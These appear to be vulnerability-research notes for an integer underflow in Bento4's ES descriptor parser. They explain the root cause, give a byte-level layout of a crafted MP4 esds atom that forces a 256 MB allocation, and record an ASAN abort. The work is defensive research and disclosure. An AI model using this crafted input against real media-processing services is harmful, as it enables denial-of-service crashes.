# VULN 001 PoC Notes — Integer Underflow in AP4_EsDescriptor SubStream size

## Vulnerability Location
- **File**: `Bento4/Source/C++/Core/Ap4EsDescriptor.cpp`, lines 100–103
- **Tool**: `mp42aac`
- **CWE**: CWE-191 (Integer Underflow) → CWE-125 (OOB Read) / CWE-789 (Uncontrolled Allocation)

## Root Cause

`AP4_EsDescriptor::AP4_EsDescriptor(AP4_ByteStream&, AP4_Size header_size, AP4_Size payload_size)` reads mandatory fields from `stream` starting at position `start`. The URL flag check at line 93 is duplicated: it reads `OcrEsId` whenever the URL flag is set, even though `WriteFields` (line 151) writes `OcrEsId` only when the OCR_STREAM flag is set. This inconsistency means parsing always reads 2 extra bytes (OcrEsId) whenever the URL flag is present.

Byte consumption path with `flags_byte = 0x40` (URL flag only):
```
m_Flags = (0x40 >> 5) & 7 = 2  (AP4_ES_DESCRIPTOR_FLAG_URL)
```
| Read | Bytes consumed |
|------|----------------|
| ES_ID (ReadUI16) | 2 |
| bits byte (ReadUI08) | 1 |
| url_length (ReadUI08) — URL flag | 1 |
| url_string (Read url_length bytes) | 0 (url_length=0) |
| OcrEsId (ReadUI16) — URL flag (line 93 BUG) | 2 |
| **Total** | **6** |

At line 102–103:
```cpp
AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                             payload_size - AP4_Size(offset-start));
// payload_size=3, AP4_Size(offset-start)=6
// 3 - 6 = 0xFFFFFFFA  (uint32_t wraps)
```

`AP4_SubStream` receives `size = 0xFFFFFFFA` (~4 GB).  Its `ReadPartial` clamps only when `m_Position + bytes_to_read > m_Size`; with `m_Size = 4294967290`, reads are unconstrained until file EOF.

## Exploit Mechanism

The crafted `esds` atom contains (positions relative to esds content start):
```
+0  00 00 00 00  version/flags
+4  03           ES_Descriptor tag
+5  03           declared payload_size = 3
+6  00 01        ES_ID = 1
+8  40           flags byte → m_Flags = 2 (URL only)
+9  00           url_length = 0  [OUTSIDE 3-byte payload, still consumed]
+10 00 00        OcrEsId = 0     [OUTSIDE 3-byte payload, still consumed]
--- underflow occurs here: SubStream(stream, offset, 0xFFFFFFFA) ---
+12 05           AP4_DESCRIPTOR_TAG_DECODER_SPECIFIC_INFO
+13 FF FF FF 7F  4-byte expandable size → payload_size = 0x0FFFFFFF = 268,435,455
```

Factory loop reads tag `0x05` and decodes size `268,435,455`:
```cpp
// AP4_DecoderSpecificInfoDescriptor constructor
m_Info.SetDataSize(268435455);        // new AP4_Byte[268435455] — 256 MB allocation
stream.Read(m_Info.UseData(), ...);   // reads from unbounded SubStream
```

## Crash Analysis

On systems where 268 MB cannot be mapped:
- `new AP4_Byte[268435455]` fails → `std::bad_alloc` → unhandled exception → SIGABRT

On the test server (968 GB RAM), the allocation succeeds silently. To expose the crash reliably, the test uses `ASAN_OPTIONS=mmap_limit_mb=200`, which causes ASAN's allocator to abort when total mmap'd memory exceeds 200 MB:

```
ASAN: (total_mmaped >> 20) < common_flags()->mmap_limit_mb
```
Exit code: 134 (SIGABRT)

Without the memory limit, on a constrained host the crash reproduces unconditionally because `new AP4_Byte[268435455]` throws `std::bad_alloc`.

## Test Result

```
Exit code 134 (SIGABRT)
ASAN aborts: (total_mmaped >> 20) < common_flags()->mmap_limit_mb
Crash triggered by: 268,435,455-byte allocation from attacker-controlled descriptor bytes
                    placed after the integer-underflowed SubStream boundary
```

## Files

| File | Description |
|------|-------------|
| `vuln_001_gen.py` | Generates `vuln_001.mp4` (530 bytes) |
| `vuln_001.mp4` | Crafted MP4 triggering the underflow |
| `vuln_001_run.sh` | Runs the PoC and collects output |
| `vuln_001_result.txt` | Actual output from the run |
| `vuln_001_notes.md` | This file |
| `vuln_001_status.txt` | VERIFIED_CRASH |
